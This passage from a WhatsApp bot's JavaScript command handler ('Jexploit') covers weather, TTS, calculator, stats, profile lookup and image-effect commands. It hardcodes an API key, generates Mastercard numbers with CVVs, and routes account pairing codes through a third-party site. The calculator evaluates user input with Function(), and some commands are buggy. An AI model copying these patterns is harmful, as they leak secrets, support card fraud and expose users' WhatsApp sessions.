    const randomAudioUrl = audioUrls[Math.floor(Math.random() * audioUrls.length)];
    
    // Send the image with caption
    await conn.sendMessage(
        m.chat, 
        { 
            image: { url: randomImageUrl },  
            caption: `*🌹Hi. I am 👑 Jexploit, a friendly WhatsApp bot.*${botInfo}`
        },
        { quoted: m }
    ).catch(err => {
        console.error('Image failed:', err.message);
        // Fallback if image fails
        return conn.sendMessage(m.chat, {
            text: `*🌹Hi. I am 👑 Jexploit, a friendly WhatsApp bot.*${botInfo}`
        }, { quoted: m });
    });
    
    // Send the randomly selected audio as audio
    await conn.sendMessage(
        m.chat,
        {
            audio: { url: randomAudioUrl },
            mimetype: 'audio/mpeg'  // Fixed mimetype
        },
        { quoted: m }
    ).catch(err => console.error('Audio failed:', err.message));
    
    break;
}
break
case "bothosting": {
try {
        

        const message = `
*STEPS ON HOW TO DEPLOY A WHATSAPP BOT*
First you need a GitHub account.
Create one using the link:
https://github.com/

Secondly create a discord account.
https://discord.com/login

Once your done creating and verifying the two account, move over to the next step.

*NEXT STEPS*
Next step is to fork the bot repository. Click the link
https://github.com/Kevintech-hub/Jexploit-Bot

Then download the zip file.

Now authorise your discord account then claim coins for 3days, each day u can claim 10 coins.


https://bot-hosting.net/?aff=1454800083857051814

*NOTE:* Some bot require larger server to process while. (25 coin)

When your done creating a server (25 coin) open the server.

Upload your bot code you have downloaded

Start server Enjoy 😉
        `.trim();

        await conn.sendMessage(from, {
            image: { url: 'https://files.catbox.moe/9sazwf.jpg' },
            caption: message,
            contextInfo: {
                mentionedJid: [m.sender],
                forwardingScore: 999,
                isForwarded: true,
                forwardedNewsletterMessageInfo: {
                    newsletterJid: '120363401548261516@newsletter',
                    newsletterName: '🪀『JEXPLOIT』🪀',
                    serverMessageId: 143
                }
            }
        }, { quoted: mek });

    } catch (e) {
        console.error("Support Cmd Error:", e);
        reply(`⚠️ An error occurred:\n${e.message}`);
    }
}
break
case 'pr':
case 'pair': {
 if (!text) {
            return reply(
                `Oops! You forgot the number.\n\nExample:\n${prefix + command} 25674293XXXX`
            );
        }

        // Normalize and validate numbers
        const numbers = text.split(",")
            .map(v => v.replace(/[^0-9]/g, "")) // keep only digits
            .filter(v => v.length >= 6 && v.length <= 20);

        if (numbers.length === 0) {
            await conn.sendMessage(
                m.chat,
                { text: "Invalid number format. Please use digits only (6–20 digits)." },
                { quoted: m }
            );
            return;
        }

        for (const number of numbers) {
            const whatsappID = `${number}@s.whatsapp.net`;
            
            try {
                // Check if number exists on WhatsApp
                const result = await conn.onWhatsApp(whatsappID);

                if (!result?.[0]?.exists) {
                    await conn.sendMessage(
                        m.chat,
                        { text: `Number ${number} is not registered on WhatsApp.` },
                        { quoted: m }
                    );
                    continue;
                }

                // Notify processing
                await conn.sendMessage(
                    m.chat,
                    { text: `Generating code for: ${number}` },
                    { quoted: m }
                );

                // Fetch pairing code from API
                const axios = require('axios');
                const response = await axios.get(
                    `https://vinic-xmd-pairing-site-dsf-crew-devs-4o7e.onrender.com/code?number=${number}`,
                    { timeout: 20000 }
                );

                const code = response.data?.code;
                if (!code || code === "Service Unavailable") {
                    throw new Error("Service Unavailable");
                }

                // Send the pairing code
                await sleep(3000);
                await conn.sendMessage(
                    m.chat,
                    { text: `${code}` },
                    { quoted: m }
                );

                // Send help instructions
                await conn.sendMessage(
                    m.chat,
                    { 
                        text: `How to Link ${number}\n\n` +
                              `1. Copy the code above\n` +
                              `2. Open WhatsApp\n` +
                              `3. Go to Settings > Linked Devices\n` +
                              `4. Tap Link a Device\n` +
                              `5. Enter the code\n` +
                              `6. Wait for it to load\n` +
                              `7. Done! Your device is now linked.\n\n` +
                              `Tip: Use the session_id in your DM to deploy.`
                    },
                    { quoted: m }
                );

            } catch (apiError) {
                console.error("API Error:", apiError.message);
                
                const errorMessage = apiError.message === "Service Unavailable"
                    ? "Service is currently unavailable. Please try again later."
                    : "Failed to generate pairing code. Please try again later.";

                await conn.sendMessage(
                    m.chat,
                    { text: errorMessage },
                    { quoted: m }
                );
            }
        }
}
break
case "serverinfo":
case "stats":
case "botstats": {
    const start = performance.now();
    const cpus = os.cpus();
    const uptimeSeconds = os.uptime();
    const muptime = runtime(process.uptime()).trim();
    const uptimeDays = Math.floor(uptimeSeconds / 86400);
    const uptimeHours = Math.floor((uptimeSeconds % 86400) / 3600);
    const uptimeMinutes = Math.floor((uptimeSeconds % 3600) / 60);
    const totalMem = os.totalmem();
    const freeMem = os.freemem();
    const usedMem = totalMem - freeMem;
    const formattedUsedMem = formatSize(usedMem);
    const formattedTotalMem = formatSize(totalMem);
    const loadAverage = os.loadavg().map(avg => avg.toFixed(2)).join(", ");
    const speed = (performance.now() - start).toFixed(3);
    
    const memPercent = ((usedMem / totalMem) * 100).toFixed(1);
    
    let totalIdle = 0, totalTick = 0;
    const cpusInfo = cpus.map(cpu => {
        let total = 0;
        for (let type in cpu.times) {
            total += cpu.times[type];
        }
        const idle = cpu.times.idle;
        const usage = ((total - idle) / total) * 100;
        totalIdle += idle;
        totalTick += total;
        return usage;
    });
    const avgCpuUsage = (cpusInfo.reduce((a, b) => a + b, 0) / cpusInfo.length).toFixed(1);
    
    const ramBarLength = 15;
    const ramFilled = Math.round((usedMem / totalMem) * ramBarLength);
    const ramBar = '█'.repeat(ramFilled) + '░'.repeat(ramBarLength - ramFilled);
    
    const cpuFilled = Math.round(avgCpuUsage / 6.7);
    const cpuBar = '█'.repeat(Math.min(cpuFilled, ramBarLength)) + '░'.repeat(Math.max(0, ramBarLength - cpuFilled));
    
    const serverInfo = `🔹 SERVER STATISTICS 🔹
    
🔸 SYSTEM
   CPU    : ${cpus[0].model.split('@')[0].trim()}
   Cores  : ${cpus.length}
   OS     : ${os.platform()} (${os.arch()})
   
🔸 PERFORMANCE
   CPU    : ${avgCpuUsage}% ${cpuBar}
   RAM    : ${memPercent}% ${ramBar}
   Used   : ${formattedUsedMem} / ${formattedTotalMem}
   Load   : ${loadAverage}
   
🔸 UPTIME
   System : ${uptimeDays}d ${uptimeHours}h ${uptimeMinutes}m
   Bot    : ${muptime}
   Ping   : ${speed}ms
   
🔸 HOST
   Name   : ${detectPlatform()}
   
🔹 ${global.wm || 'Vesper-Xmd'} 🔹`;

    await reply(serverInfo);
    
}
break
//======[OTHER MUNE CMDS]====
case 'weather': {
                      try {

if (!text) return reply("provide a city/town name");

const response = await fetch(`http://api.openweathermap.org/data/2.5/weather?q=${text}&units=metric&appid=1ad47ec6172f19dfaf89eb3307f74785`);
        const data = await response.json();

console.log("Weather data:",data);

        const cityName = data.name;
        const temperature = data.main.temp;
        const feelsLike = data.main.feels_like;
        const minTemperature = data.main.temp_min;
        const maxTemperature = data.main.temp_max;
        const description = data.weather[0].description;
        const humidity = data.main.humidity;
        const windSpeed = data.wind.speed;
        const rainVolume = data.rain ? data.rain['1h'] : 0;
        const cloudiness = data.clouds.all;
        const sunrise = new Date(data.sys.sunrise * 1000);
        const sunset = new Date(data.sys.sunset * 1000);

await m.reply(`❄️ Weather in ${cityName}

🌡️ Temperature: ${temperature}°C
📝 Description: ${description}
❄️ Humidity: ${humidity}%
🌀 Wind Speed: ${windSpeed} m/s
🌧️ Rain Volume (last hour): ${rainVolume} mm
☁️ Cloudiness: ${cloudiness}%
🌄 Sunrise: ${sunrise.toLocaleTimeString()}
🌅 Sunset: ${sunset.toLocaleTimeString()}`);

} catch (e) { reply("Unable to find that location.") }
  }
break;
case 'add2': {
                if (!m.isGroup) return m.reply(mess.group)
                if(!Access) return m.reply(mess.owner)
                if (!m.isAdmin) return reply(mess.notadmin);
                if (!m.isBotAdmin) return reply(mess.botadmin);
                let blockwwww = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
                await conn.groupParticipantsUpdate(m.chat, [blockwwww], 'add')
                m.reply(mess.done)
          }
                



//==================================================//   
case "disp90days": { 
 if (!m.isGroup) return reply (mess.group); 

 if (!m.isAdmin) return reply(mess.notadmin);
 if (!m.isBotAdmin) return reply(mess.botadmin);

                     await conn.groupToggleEphemeral(m.chat, 90*24*3600); 
 m.reply('Dissapearing messages successfully turned on for 90 days!'); 
 } 
 break; 
//==================================================//         
case "dispoff": { 
    if (!m.isGroup) return reply (mess.group); 

    if (!m.isAdmin) return reply(mess.notadmin);
    if (!m.isBotAdmin) return reply(mess.botadmin);
                     await conn.groupToggleEphemeral(m.chat, 0); 
 m.reply('Dissapearing messages successfully turned off!'); 
 }
   break;

//==================================================//  
case "disp24hours": { 
if (!m.isGroup) return reply (mess.group); 

 if (!m.isAdmin) return reply(mess.notadmin);
    if (!m.isBotAdmin) return reply(mess.botadmin);

                     await conn.groupToggleEphemeral(m.chat, 1*24*3600); 
 m.reply('Dissapearing messages successfully turned on for 24hrs!'); 
 } 
break
//==================================================//
case "dev":
case "developer": {
  try {
    // Developer information (replace with your actual details)
    const devInfo = {
      name: "Kevin Tech",      // Developer name
      number: "256742932677",  // Developer WhatsApp number (without + or @)
      organization: "Jexploit Development Team",
      note: "Bot Developer"
    };

    // Create vCard
    const vcard = `BEGIN:VCARD
VERSION:3.0
FN:${devInfo.name}
ORG:${devInfo.organization};
TEL;type=CELL;type=VOICE;waid=${devInfo.number}:${devInfo.number}
NOTE:${devInfo.note}
END:VCARD`;

    // Send as contact card
    await conn.sendMessage(
      m.chat, 
      {
        contacts: {
          displayName: devInfo.name,
          contacts: [{
            displayName: devInfo.name,
            vcard: vcard
          }]
        },
        contextInfo: {
          mentionedJid: [m.sender],
          externalAdReply: {
            title: `Developer Contact`,
            body: `Contact ${devInfo.name} for support`,
            thumbnail: fs.readFileSync('./start/lib/kelvin/dev.jpg'), // Your dev photo
            mediaType: 1,
            renderLargerThumbnail: true
          }
        }
      },
      { quoted: m }
    );

    // Also send text info as fallback
    await conn.sendMessage(
      m.chat,
      { 
        text: `👨‍💻 *Developer Information*\n\n` +
              `• *Name:* ${devInfo.name}\n` +
              `• *Contact:* wa.me/${devInfo.number}\n` +
              `• *Role:* ${devInfo.note}\n` +
              `• *Team:* ${devInfo.organization}`,
              
        mentions: [m.sender]
      },
      { quoted: m }
    );

  } catch (error) {
    console.error('Error in dev command:', error);
    reply(mess.error);
  }
}
break
case "say": {
let text = args.join(" ");
    if (!text) return reply("*Text needed!*");

    try {
      const ttsData = await googleTTS.getAllAudioBase64(text, {
        lang: "en",
        slow: false,
        host: "https://translate.google.com",
        timeout: 10000,
      });

      if (!ttsData.length) return reply("*Failed to generate TTS audio.*");

      const tempFiles = [];
      for (let i = 0; i < ttsData.length; i++) {
        let filePath = `/tmp/tts_part${i}.mp3`;
        fs.writeFileSync(filePath, Buffer.from(ttsData[i].base64, "base64"));
        tempFiles.push(filePath);
      }

      
      let mergedFile = "/tmp/tts_merged.mp3";
      let ffmpegCommand = `ffmpeg -i "concat:${tempFiles.join('|')}" -acodec copy ${mergedFile}`;
      exec(ffmpegCommand, async (err) => {
        if (err) {
          console.error("FFmpeg error:", err);
          return reply("*Error merging audio files.*");
        }

        await conn.sendMessage(
          m.chat,
          {
            audio: fs.readFileSync(mergedFile),
            mimetype: "audio/mp4",
            mp3: true,
            fileName: "tts_audio.mp3",
          },
          { quoted: m }
        );

        tempFiles.forEach(file => fs.unlinkSync(file));
        fs.unlinkSync(mergedFile);
      });
    } catch (error) {
      console.error("Error in TTS Command:", error);
      reply(mess.error);
    }
}
break
case "tinylink": {
    if (!text) return reply(`*Example: ${prefix + command} https://github.com/Kevintech-hub/Vinic-Xmd-*`);
    
    try {
      const response = await axios.get(`https://tinyurl.com/api-create.php?url=${text}`);
      reply(response.data);
    } catch (error) {
      console.error(error);
      reply(mess.error);
    }
}
break
case "vcc": {
const apiUrl = `${global.mess.siputzx}/api/tools/vcc-generator?type=MasterCard&count=5`;

    try {
      const response = await fetch(apiUrl);
      const result = await response.json();

      if (!result.status || !result.data || result.data.length === 0) {
        return reply("❌ Unable to generate VCCs. Please try again later.");
      }

      let responseMessage = `🎴 *Generated VCCs* (Type: Mastercard and Count: 5):\n\n`;

      result.data.forEach((card, index) => {
        responseMessage += `#️⃣ *Card ${index + 1}:*\n`;
        responseMessage += `🔢 *Card Number:* ${card.cardNumber}\n`;
        responseMessage += `📅 *Expiration Date:* ${card.expirationDate}\n`;
        responseMessage += `🧾 *Cardholder Name:* ${card.cardholderName}\n`;
        responseMessage += `🔒 *CVV:* ${card.cvv}\n\n`;
      });

      reply(responseMessage);
    } catch (error) {
      console.error("Error fetching VCC data:", error);
      reply(mess.error);
    }
}
break
case "calculate":
case "calc": {
    try {
        if (!text) return reply(`📝 *Examples:*\n${prefix}calc 5 + 3\n${prefix}calc 10% of 200\n${prefix}calc 2^3\n${prefix}calc sqrt(16)`);

        // Clean and prepare the expression
        const expr = text
            .replace(/×/g, '*')
            .replace(/÷/g, '/')
            .replace(/π/g, 'pi')
            .replace(/π/g, 'pi')
            .replace(/\^/g, '**') // Convert ^ to ** for exponentiation
            .replace(/sqrt\(/g, 'Math.sqrt(')
            .replace(/sin\(/g, 'Math.sin(')
            .replace(/cos\(/g, 'Math.cos(')
            .replace(/tan\(/g, 'Math.tan(')
            .replace(/log\(/g, 'Math.log10(')
            .replace(/ln\(/g, 'Math.log(')
            .replace(/abs\(/g, 'Math.abs(')
            .replace(/%/g, '/100')
            .replace(/deg/g, 'deg')
            .replace(/,/g, ';')
            .trim();

        // Validate expression for safety
        const safeRegex = /^[0-9+\-*/().\s\^%πesincoqrtanlgabMh\s]+$/i;
        if (!safeRegex.test(expr)) {
            return reply('❌ *Invalid characters in expression.*\nOnly numbers, basic operators, and math functions are allowed.');
        }

        let result;
        
        // Handle percentage calculations
        if (text.includes('%')) {
            const percentMatch = text.match(/(\d+)%\s*(of)?\s*(\d+)/i);
            if (percentMatch) {
                const percent = parseFloat(percentMatch[1]);
                const number = parseFloat(percentMatch[3]);
                result = (percent / 100) * number;
            }
        }
        
        // Handle unit conversions
        else if (text.includes('to')) {
            const conversionMatch = text.match(/(\d+)\s*(\w+)\s*to\s*(\w+)/i);
            if (conversionMatch) {
                const value = parseFloat(conversionMatch[1]);
                const fromUnit = conversionMatch[2].toLowerCase();
                const toUnit = conversionMatch[3].toLowerCase();
                
                result = convertUnits(value, fromUnit, toUnit);
                if (result !== undefined) {
                    reply(`*Conversion:* ${value} ${fromUnit} = ${result} ${toUnit}`);
                    return;
                }
            }
        }

        // Evaluate mathematical expression
        if (result === undefined) {
            try {
                // Use Function constructor for safer evaluation
                result = Function('"use strict"; return (' + expr + ')')();
                
                // Check if result is valid
                if (typeof result !== 'number' || isNaN(result) || !isFinite(result)) {
                    throw new Error('Invalid result');
                }
                
            } catch (evalError) {
                console.error('Calculation error:', evalError);
                return reply('❌ *Could not calculate the expression.*\nPlease check your syntax and try again.');
            }
        }

        // Format the result
        let formattedResult = result;
        if (Number.isInteger(result)) {
            formattedResult = result.toString();
        } else {
            formattedResult = result.toFixed(6).replace(/\.?0+$/, '');
        }

        // Create response
        const calculationResponse = `
🧮 *CALCULATION RESULT*

*Expression:* ${text}
*Result:* ${formattedResult}

*Full precision:* ${result}
        `.trim();

        reply(calculationResponse);

    } catch (error) {
        console.error('Error in calculate command:', error);
        reply(mess.error);
    }
    
}
break
case "owner": {
    try {
        
        // Get owner info from SQLite
        const ownernumber = await db.get(botNumber, 'ownernumber', '256742932677');
        const ownername = await db.get(botNumber, 'ownername', 'Owner');
        
        // Format the number
        const cleanNumber = String(ownernumber).replace(/\D/g, '');
        
        // Create contact vcard
        const ownerContact = [{
            displayName: ownername,
            vcard: `BEGIN:VCARD\nVERSION:3.0\nN:${ownername}\nFN:${ownername}\nitem1.TEL;waid=${cleanNumber}:${cleanNumber}\nitem1.X-ABLabel:Mobile\nEND:VCARD`,
        }];

        // Send only the contact
        await conn.sendMessage(
            m.chat,
            { 
                contacts: { 
                    displayName: `Owner Contact`, 
                    contacts: ownerContact 
                }
            },
            { quoted: m }
        );
        
    } catch (error) {
        console.error('Error sending owner contact:', error.message);
        reply(mess.error);
    }
    
}
break
case "listpc": {
if (!Access) return reply(mess.owner);
let anulistp = await store.chats.all().filter(v => v.id.endsWith('.net')).map(v => v.id)
let teks = `*Private Chat*\nTotal: ${anulistp.length} Chat\n\n`
for (let i of anulistp) {
let nama = store.messages[i].array[0].pushName
teks += `*Name :* ${pushname}\n*User :* @${sender.split('@')[0]}\n*Chat :* https://wa.me/${sender.split('@')[0]}\n\n───────────\n\n`
}
reply(teks)
}
break
case 'getbisnis':
case 'getbusiness': {
    try {
        let input = m.quoted ? m.quoted.sender : text || m.sender;
        
        if (!input) {
            return reply(`⚠️ Please provide a phone number or reply to a message!\n\nUsage: *${prefix}getbusiness 256742932677*`);
        }
        
        // Clean and format the number
        input = input.replace(/[^0-9]/g, '');
        
        let target;
        if (input.startsWith('0')) {
            target = '256' + input.slice(1) + '@s.whatsapp.net';
        } else if (input.length === 9) {
            target = '256' + input + '@s.whatsapp.net';
        } else if (input.length === 12 && input.startsWith('256')) {
            target = input + '@s.whatsapp.net';
        } else {
            target = input + '@s.whatsapp.net';
        }
        
        // Get business profile
        const profile = await conn.getBusinessProfile(target);
        
        // Check if profile exists
        if (!profile) {
            return reply(`❌ No business profile found for this number.`);
        }
        
        // Get name and profile picture
        const name = await conn.getName(target).catch(() => 'Unknown');
        const pfp = await conn.profilePictureUrl(target, 'image').catch(() => null);
        
        // Safely extract profile data
        const desc = profile?.description || 'No description available';
        const category = profile?.category || 'Not specified';
        const website = profile?.website || 'Not provided';
        const address = profile?.address || 'Not provided';
        const email = profile?.email || 'Not provided';
        
        const caption = `📇 *BUSINESS PROFILE*\n\n` +
            `👤 *Name:* ${name}\n` +
            `🏢 *Category:* ${category}\n` +
            `🌐 *Website:* ${website}\n` +
            `📍 *Address:* ${address}\n` +
            `✉️ *Email:* ${email}\n\n` +
            `📝 *Description:*\n${desc}`;
        
        if (pfp) {
            await conn.sendMessage(m.chat, {
                image: { url: pfp },
                caption: caption
            }, { quoted: m });
        } else {
            await reply(caption);
        }
        
    } catch (err) {
        console.error('GetBusiness error:', err);
        
        if (err.message.includes('404')) {
            reply(`❌ Business profile not found for this number.`);
        } else {
            reply(`❌ Failed to fetch business profile: ${err.message}`);
        }
    }
    
}
break
case "botstatus":
case "stats": {
    const used = process.memoryUsage();
    const totalRam = os.totalmem();
    const freeRam = os.freemem();
    const usedRam = totalRam - freeRam;
    const ramPercent = ((usedRam / totalRam) * 100).toFixed(1);
    
    const disk = await checkDiskSpace(process.cwd());
    const diskUsed = disk.size - disk.free;
    const diskPercent = ((diskUsed / disk.size) * 100).toFixed(1);
    
    const latencyStart = performance.now();
    await reply("⏳ *Calculating System Info...*");
    const latencyEnd = performance.now();
    const ping = `${(latencyEnd - latencyStart).toFixed(2)} ms`;
    
    const uptime = runtime(process.uptime());
    
    const response = `
╭──❖ 「 BOT STATUS 」 ❖──
│
🔸 *Ping*       : ${ping}
🔸 *Uptime*     : ${uptime}
│
🔹 *RAM*        : ${formatSize(usedRam)} / ${formatSize(totalRam)} (${ramPercent}%)
🔹 *Heap*       : ${formatSize(used.heapUsed)} / ${formatSize(used.heapTotal)}
│
🔸 *Disk*       : ${formatSize(diskUsed)} / ${formatSize(disk.size)} (${diskPercent}%)
🔸 *Free Disk*  : ${formatSize(disk.free)}
│
🔹 *Platform*   : ${detectPlatform()}
🔹 *Node*       : ${process.version}
🔹 *CPU*        : ${os.cpus()[0].model.substring(0, 25)}...
│
╰────────────────────❖`;

    await conn.sendMessage(m.chat, { text: response.trim() }, { quoted: m });
    break;
}
break
case "getabout": {
    if (!Access) return reply(mess.owner);
    
    let userId;
    
    // Check if replying to a message or providing a number
    if (m.quoted) {
        userId = m.quoted.sender;
    } else if (text) {
        // Format the number if provided
        let cleanNumber = text.replace(/[^0-9]/g, '');
        if (cleanNumber.startsWith('0')) {
            cleanNumber = '256' + cleanNumber.slice(1);
        }
        userId = cleanNumber + '@s.whatsapp.net';
    } else {
        return reply('⚠️ Reply to a user or provide a phone number!\n\nUsage:\n• Reply to a message: *.getabout*\n• Provide number: *.getabout 256742932677*');
    }

    try {
        // Fetch user's status/about
        const { status, setAt } = await conn.fetchStatus(userId);
        
        if (!status) {
            return reply(`❌ No about/bio found for @${userId.split('@')[0]}`, { mentions: [userId] });
        }
        
        const formattedDate = moment(setAt).format("MMMM Do YYYY, h:mm:ss A");
        
        await conn.sendMessage(m.chat, { 
            text: `📝 *ABOUT/BIO*\n\n👤 *User:* @${userId.split('@')[0]}\n📋 *Status:* "${status}"\n\n🕒 *Set at:* ${formattedDate}`,
            mentions: [userId] 
        }, { quoted: m });

    } catch (error) {
        console.error('Getabout error:', error);
        
        if (error.message.includes('404')) {
            reply(`❌ No about/bio found for this user.`);
        } else {
            reply(`❌ Failed to fetch about: ${error.message}`);
        }
    }
    
}
break
case "smartphone":
case "gsmarena": {
    if (!text) return reply("*Please provide a query to search for smartphones.*");

    try {
      let result;
      let success = false;
      
      // Try primary API first
      try {
        const apiUrl = `${global.mess.siputzx}/api/s/gsmarena?query=${encodeURIComponent(text)}`;
        const response = await fetch(apiUrl);
        result = await response.json();

        if (result.status && result.data && result.data.length > 0) {
          success = true;
        } else {
          throw new Error('Primary API returned no results');
        }
      } catch (primaryError) {
        console.log('Primary API failed, trying fallback API...');
        
        // Fallback to new API
        const fallbackUrl = `https://api.nexray.eu.cc/search/gsmarena?q=${encodeURIComponent(text)}`;
        const fallbackResponse = await fetch(fallbackUrl);
        const fallbackResult = await fallbackResponse.json();
        
        if (fallbackResult.status && fallbackResult.result && fallbackResult.result.length > 0) {
          result = { status: true, data: fallbackResult.result };
          success = true;
        } else {
          throw new Error('Fallback API also failed');
        }
      }

      if (!success || !result.data || result.data.length === 0) {
        return reply("*No results found. Please try another query.*");
      }

      const limitedResults = result.data.slice(0, 10);
      let responseMessage = `*Top 10 Results for "${text}":*\n\n`;

      for (let item of limitedResults) {
        responseMessage += `📱 *Name:* ${item.name}\n`;
        responseMessage += `📝 *Description:* ${item.description}\n`;
        responseMessage += `🌐 [View Image](${item.thumbnail})\n\n`;
      }

      reply(responseMessage);
    } catch (error) {
      console.error('Error fetching results from GSMArena API:', error);
      reply(mess.error);
    }
}
break
case "countryinfo": {
const country = args.join(' ');
    
    if (!country) return reply("*Please provide a country name. Example: `.countryinfo Uganda*`");
    
    try {
      const response = await fetch(`${global.mess.siputzx}/api/tools/countryInfo?name=${encodeURIComponent(country)}`);
      const data = await response.json();
      
      if (!data.status || !data.data) {
        return reply(`No information found for "${country}"`);
      }
      
      const info = data.data;
      
      let message = `*Country Information: ${info.name}*\n\n`;
      message += `Capital: ${info.capital || 'N/A'}\n`;
      message += `Phone Code: ${info.phoneCode || 'N/A'}\n`;
      message += `Continent: ${info.continent?.name || 'N/A'}\n`;
      message += `Coordinates: ${info.coordinates?.latitude || 'N/A'}, ${info.coordinates?.longitude || 'N/A'}\n`;
      message += `Area: ${info.area?.squareKilometers?.toLocaleString() || 'N/A'} km²\n`;
      message += `Landlocked: ${info.landlocked ? 'Yes' : 'No'}\n`;
      message += `Famous For: ${info.famousFor || 'N/A'}\n`;
      message += `Government: ${info.constitutionalForm || 'N/A'}\n`;
      message += `Currency: ${info.currency || 'N/A'}\n`;
      message += `Driving Side: ${info.drivingSide || 'N/A'}\n`;
      message += `Internet TLD: ${info.internetTLD || 'N/A'}\n`;
      message += `ISO Code: ${info.isoCode?.alpha2?.toUpperCase() || 'N/A'}\n\n`;
      
      if (info.languages) {
        message += `Languages:\n`;
        if (info.languages.native?.length) message += `  Native: ${info.languages.native.join(', ')}\n`;
        if (info.languages.codes?.length) message += `  Codes: ${info.languages.codes.join(', ')}\n`;
      }
      
      if (info.neighbors?.length) {
        message += `\nNeighboring Countries:\n`;
        info.neighbors.slice(0, 3).forEach(neighbor => {
          message += `  • ${neighbor.name}\n`;
        });
      }
      
      if (info.flag) {
        await conn.sendMessage(m.chat, {
          image: { url: info.flag },
          caption: message
        }, { quoted: m });
      } else {
        reply(message);
      }
      
    } catch (error) {
      console.error('Country info error:', error);
      reply("Error fetching country information.");
    }
}
break
case "time": {
    try {
        const now = moment().tz(global.timezones || "Africa/Kampala");
        const timeInfo = `
⏰ *Current Bot Time* ⏰

🌍 *Timezone:* ${now.format('z (Z)')}
📅 *Date:* ${now.format('dddd, MMMM Do YYYY')}
🕒 *Time:* ${now.format('h:mm:ss A')}
🕛 *24-hour format:* ${now.format('HH:mm:ss')}
📆 *Week Number:* ${now.format('WW')}
⏳ *Day of Year:* ${now.format('DDD')}

> ${global.wm || 'Jexploit Bot'}
        `.trim();

        await conn.sendMessage(m.chat, { text: timeInfo }, { quoted: m });

    } catch (error) {
        console.error('Error in time command:', error);
        reply('❌ *Unable to fetch time information.*');
    }
    
}
// ===== EOHOT EFFECTS ============
break
case "glossysilver": {
    try {
        if (!text) return reply('Please provide text. Example: .glossysilver Hello World');
        
        let query = text.trim();
        let res = await fetch(`https://api.giftedtech.co.ke/api/photooxy/glossy-silver?apikey=gifted&text=${encodeURIComponent(query)}`);
        
        if (!res.ok) {
            throw new Error(`API request failed with status ${res.status}`);
        }
        
        let json = await res.json();
        
        // Check if the response has the expected structure
        if (json && json.success && json.result && json.result.image_url) {
            await conn.sendMessage(m.chat, { 
                image: { url: json.result.image_url },
                caption: `✨ Glossy Silver Text: ${query}`
            }, { quoted: m });
        } else {
            throw new Error('Invalid API response structure');
        }
    } catch (error) {
        console.error('Error generating glossy silver text:', error);
        reply(mess.error);
    }
}
break
case 'arting': {
    if (!text) return reply('Provide text! Example: .arting girl wearing glasses');
    await conn.sendMessage(m.chat, { react: { text: '✨', key: m.key }});
    
    try {
        await conn.sendMessage(m.chat, { image: { url: `https://api.nekorinn.my.id/ai-img/arting?text=${text}` }, caption: `> ${global.wm}`}, { quoted: m });
    } catch (err) {
        console.log(err.message);
        conn.sendMessage(m.chat, { react: { text: '❌', key: m.key }});
        reply(mess.error);
    }
}  
break   
case "advancedglow": {
let q = args.join(" ");
    if (!q) {
      return reply(`*Example: ${prefix}advancedglow Kevin*`);
    }

    const link = "https://en.ephoto360.com/advanced-glow-effects-74.html";

    try {
      let result = await ephoto(link, q);
      await conn.sendMessage(
        m.chat,
        { image: { url: result }, caption: `> ${global.wm}` },
        { quoted: m }
      );
    } catch (error) {
      console.error("Error in advancedglow command:", error);
      reply(mess.error);
      }
}
break
case "blackpinklogo": {
    let q = args.join(" ");
    if (!q) {
      return reply(`*Example: ${prefix}blackpinklogo Kevin*`);
    }

    const link = "https://en.ephoto360.com/create-blackpink-logo-online-free-607.html";

    try {
      let result = await ephoto(link, q);
      await conn.sendMessage(
        m.chat,
        { image: { url: result }, caption: `> ${global.wm}` },
        { quoted: m }
      );
    } catch (error) {
      console.error("Error in blackpinklogo command:", error);
      reply("*An error occurred while generating the effect.*");
    }
}
break
case "blackpinkstyle": {
    let q = args.join(" ");
    if (!q) {
      return reply(`*Example: ${prefix}blackpinkstyle Kevin*`);
    }

    const link = "https://en.ephoto360.com/online-blackpink-style-logo-maker-effect-711.html";

    try {
      let result = await ephoto(link, q);
      await conn.sendMessage(
        m.chat,
        { image: { url: result }, caption: `> ${global.wm}` },
        { quoted: m }
      );
    } catch (error) {
      console.error("Error in blackpinkstyle command:", error);
      reply("*An error occurred while generating the effect.*");
    }
}
break
case "cartoonstyle": {
    let q = args.join(" ");
    if (!q) {
      return reply(`*Example: ${prefix}cartoonstyle Kevin*`);
    }

    const link = "https://en.ephoto360.com/create-a-cartoon-style-graffiti-text-effect-online-668.html";

    try {
      let result = await ephoto(link, q);
      await conn.sendMessage(
        m.chat,
        { image: { url: result }, caption: `> ${global.wm}` },
        { quoted: m }
      );
    } catch (error) {
      console.error("Error in cartoonstyle command:", error);
      reply("*An error occurred while generating the effect.*");
    }
}
break
case "deadpool": {
    let q = args.join(" ");
    if (!q) {
      return reply(`*Example: ${prefix}deadpool Kevin*`);
    }

    const link = "https://en.ephoto360.com/create-light-effects-green-neon-online-429.html";

    try {
      let result = await ephoto(link, q);
      await conn.sendMessage(
        m.chat,
        { image: { url: result }, caption: `> ${global.wm}` },
        { quoted: m }
      );
    } catch (error) {
      console.error("Error in deadpool command:", error);
      reply("*An error occurred while generating the effect.*");
    }
} 
break
case "effectclounds": {
let q = args.join(" ");
    if (!q) {
      return reply(`*Example: ${prefix}effectclouds Kevin*`);
    }

    const link = "https://en.ephoto360.com/write-text-effect-clouds-in-the-sky-online-619.html";

    try {
      let result = await ephoto(link, q);
      await conn.sendMessage(
        m.chat,
        { image: { url: result }, caption: `> ${global.wm}` },
        { quoted: m }
      );
    } catch (error) {
      console.error("Error in effectclouds command:", error);
      reply("*An error occurred while generating the effect.*");
    }
}
break
case "flagtext": {
let q = args.join(" ");
    if (!q) {
      return reply(`*Example: ${prefix}flagtext Kevin*`);
    }

    const link = "https://en.ephoto360.com/nigeria-3d-flag-text-effect-online-free-753.html";

    try {
      let result = await ephoto(link, q);
      await conn.sendMessage(
        m.chat,
        { image: { url: result }, caption: `> ${global.wm}` },
        { quoted: m }
      );
    } catch (error) {
      console.error("Error in flagtext command:", error);
      reply("*An error occurred while generating the effect.*");
    }
}
break
case "freecreate": {
    let q = args.join(" ");
    if (!q) {
      return reply(`*Example: ${prefix}freecreate Kevin*`);
    }

    const link = "https://en.ephoto360.com/free-create-a-3d-hologram-text-effect-441.html";

    try {
      let result = await ephoto(link, q);
      await conn.sendMessage(
        m.chat,
        { image: { url: result }, caption: `> ${global.wm}` },
        { quoted: m }
      );
    } catch (error) {
      console.error("Error in freecreate command:", error);
      reply("*An error occurred while generating the effect.*");
    }
}
break
case "galaxystyle": {
    let q = args.join(" ");
    if (!q) {
      return reply(`*Example: ${prefix}galaxystyle Kevin*`);
    }

